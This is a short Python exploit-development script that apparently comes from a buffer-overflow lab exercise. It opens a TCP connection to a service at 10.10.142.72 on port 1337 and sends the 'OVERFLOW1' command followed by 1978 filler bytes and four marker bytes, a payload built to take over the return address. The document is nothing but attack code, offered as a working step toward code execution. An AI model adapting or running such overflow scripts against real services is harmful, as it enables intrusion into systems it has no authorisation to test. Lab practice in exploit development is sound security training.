#!/usr/bin/env python3

import socket

host = "10.10.142.72"
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
cmd = "OVERFLOW1 "
offset = "a"*1978
pay = "b"*4

payload = bytes(cmd + offset + pay, 'latin-1')
s.send(payload)
